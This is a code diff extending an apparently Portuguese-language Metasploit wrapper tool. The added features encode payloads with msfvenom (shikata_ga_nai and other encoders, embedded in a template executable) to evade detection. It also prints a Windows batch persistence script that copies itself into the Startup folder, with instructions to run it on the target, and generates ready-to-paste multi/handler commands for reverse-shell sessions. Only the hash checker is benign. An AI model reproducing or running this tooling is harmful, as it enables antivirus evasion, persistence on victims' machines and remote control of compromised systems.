@@ -6,6 +6,7 @@ import os
 import sys
 import subprocess
 from time import sleep
+import hashlib
 
 try:
     from prettytable import PrettyTable
@@ -88,6 +89,89 @@ def show_network_interfaces():
     print(f"\n{colors.YELLOW}Interfaces de rede disponíveis:{colors.RESET}")
     print(table)
 
+def hash_file_menu():
+    clear_screen()
+    show_banner()
+    print(f"{colors.PURPLE}>>> VERIFICADOR DE HASH DE ARQUIVO <<<{colors.RESET}")
+    file_path = input("Digite o caminho do arquivo para verificar o hash: ").strip()
+    if not os.path.isfile(file_path):
+        print(f"{colors.RED}Arquivo não encontrado!{colors.RESET}")
+        sleep(1)
+        return
+    print(f"\n{colors.YELLOW}MD5: {get_hash(file_path, 'md5')}{colors.RESET}")
+    print(f"{colors.YELLOW}SHA1: {get_hash(file_path, 'sha1')}{colors.RESET}")
+    print(f"{colors.YELLOW}SHA256: {get_hash(file_path, 'sha256')}{colors.RESET}")
+    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")
+
+def get_hash(file_path, hash_type):
+    h = hashlib.new(hash_type)
+    with open(file_path, 'rb') as file:
+        while True:
+            chunk = file.read(4096)
+            if not chunk:
+                break
+            h.update(chunk)
+    return h.hexdigest()
+
+def encoder_menu():
+    clear_screen()
+    show_banner()
+    print(f"{colors.PURPLE}>>> ENCODER DE PAYLOAD <<<{colors.RESET}")
+    file_path = input("Digite o caminho do payload para encodar: ").strip()
+    if not os.path.isfile(file_path):
+        print(f"{colors.RED}Arquivo não encontrado!{colors.RESET}")
+        sleep(1)
+        return
+    print("Escolha um encoder:")
+    encoders = {
+        1: "x86/shikata_ga_nai",
+        2: "x86/countdown",
+        3: "x86/jmp_call_additive",
+        4: "Nenhum (voltar)"
+    }
+    for k, v in encoders.items():
+        print(f"[{k}] {v}")
+    try:
+        choice = int(input("Encoder: "))
+        if choice == 4:
+            return
+        encoder = encoders.get(choice)
+        if not encoder:
+            print(f"{colors.RED}Opção inválida!{colors.RESET}")
+            sleep(1)
+            return
+        out_file = input("Nome para o novo arquivo encodado (ex: encoded_payload.exe): ").strip()
+        if not out_file:
+            out_file = "encoded_" + os.path.basename(file_path)
+        cmd = [
+            "msfvenom", "-e", encoder, "-i", "3", "-f", "exe", "-o", out_file, "-x", file_path
+        ]
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            if result.returncode == 0:
+                print(f"{colors.YELLOW}\nPayload encodado salvo em: {out_file}{colors.RESET}")
+            else:
+                print(f"{colors.RED}\nErro ao encodar!{colors.RESET}")
+                print(result.stderr)
+        except Exception as e:
+            print(f"{colors.RED}Falha ao executar msfvenom: {e}{colors.RESET}")
+        input(f"\n{colors.BLUE}Pressione Enter para continuar...{colors.RESET}")
+    except ValueError:
+        print(f"{colors.RED}Por favor, digite um número!{colors.RESET}")
+        sleep(1)
+
+def persistence_menu():
+    clear_screen()
+    show_banner()
+    print(f"{colors.PURPLE}>>> SCRIPT BÁSICO DE PERSISTÊNCIA <<<{colors.RESET}")
+    print(f"{colors.YELLOW}Este é um exemplo simples para Windows (bat):{colors.RESET}\n")
+    print(r"""
+@echo off
+copy %~f0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\venom.bat"
+""")
+    print("\nColoque o payload no mesmo local do script (.bat) e execute no alvo.")
+    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")
+
 def generate_payload(target):
     clear_screen()
     show_banner()
@@ -145,6 +229,14 @@ def generate_payload(target):
         result = subprocess.run(msfvenom_cmd, capture_output=True, text=True)
         if result.returncode == 0:
             print(f"{colors.YELLOW}\nPayload gerado com sucesso: {out_file}{colors.RESET}")
+            print(f"{colors.GREEN}\nComando para usar no msfconsole:{colors.RESET}")
+            print(f"{colors.BLUE}use exploit/multi/handler")
+            print(f"set PAYLOAD {payload_types[target]['payload']}")
+            print(f"set LHOST {lhost}")
+            print(f"set LPORT {lport}")
+            print("run" + colors.RESET)
+            print(f"\n{colors.YELLOW}Comando completo para colar:{colors.RESET}")
+            print(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload_types[target]['payload']}; set LHOST {lhost}; set LPORT {lport}; run'")
         else:
             print(f"{colors.RED}\nErro ao gerar o payload!{colors.RESET}")
             print(result.stderr)
@@ -156,22 +248,56 @@ def listener_menu():
     clear_screen()
     show_banner()
     print(f"\n{colors.PURPLE}>>> MENU DE ESCUTA <<<{colors.RESET}")
-    print(f"{colors.YELLOW}Para iniciar um ouvinte (listener) manualmente, use:{colors.RESET}")
-    print(f"{colors.GREEN}msfconsole -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <seu_ip>; set LPORT <sua_porta>; run'{colors.RESET}")
+    print(f"{colors.YELLOW}Você pode criar o comando e copiar para o msfconsole:{colors.RESET}")
+    payload = input("PAYLOAD (ex: windows/meterpreter/reverse_tcp): ").strip()
+    lhost = input("LHOST (IP): ").strip()
+    lport = input("LPORT (porta): ").strip()
+    print(f"\n{colors.GREEN}Comando para colar:{colors.RESET}")
+    print(f"{colors.BLUE}use exploit/multi/handler")
+    print(f"set PAYLOAD {payload}")
+    print(f"set LHOST {lhost}")
+    print(f"set LPORT {lport}")
+    print("run" + colors.RESET)
+    print(f"\n{colors.YELLOW}Comando completo para colar:{colors.RESET}")
+    print(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; run'")
     input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")
 
 def utilities_menu():
-    clear_screen()
-    show_banner()
-    print(f"\n{colors.PURPLE}>>> UTILITÁRIOS DE PAYLOAD <<<{colors.RESET}")
-    print(f"{colors.YELLOW}- Esta seção pode ser expandida para utilitários reais, codificação, etc.{colors.RESET}")
-    input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")
+    while True:
+        clear_screen()
+        show_banner()
+        print(f"\n{colors.PURPLE}>>> UTILITÁRIOS DE PAYLOAD <<<{colors.RESET}")
+        print(f"{colors.GREEN}[1] Encoder de Payload")
+        print(f"{colors.GREEN}[2] Verificador de Hash")
+        print(f"{colors.GREEN}[3] Script de Persistência")
+        print(f"{colors.RED}[4] Voltar ao Menu Principal{colors.RESET}")
+        try:
+            choice = int(input("\nSelecione uma opção: "))
+            if choice == 1:
+                encoder_menu()
+            elif choice == 2:
+                hash_file_menu()
+            elif choice == 3:
+                persistence_menu()
+            elif choice == 4:
+                return
+            else:
+                print(f"{colors.RED}Opção inválida!{colors.RESET}")
+                sleep(1)
+        except ValueError:
+            print(f"{colors.RED}Por favor, digite um número!{colors.RESET}")
+            sleep(1)
 
 def session_menu():
     clear_screen()
     show_banner()
     print(f"\n{colors.PURPLE}>>> GERENCIAMENTO DE SESSÕES <<<{colors.RESET}")
-    print(f"{colors.YELLOW}- Use o msfconsole para gerenciar sessões. Este menu é para futuras expansões.{colors.RESET}")
+    print(f"{colors.YELLOW}Listando sessões ativas do Metasploit (necessário msfconsole rodando)...{colors.RESET}")
+    try:
+        result = subprocess.run(["msfconsole", "-x", "sessions -l; exit"], capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"{colors.RED}Erro ao executar msfconsole: {e}{colors.RESET}")
     input(f"\n{colors.BLUE}Pressione Enter para voltar...{colors.RESET}")
 
 def payload_menu():
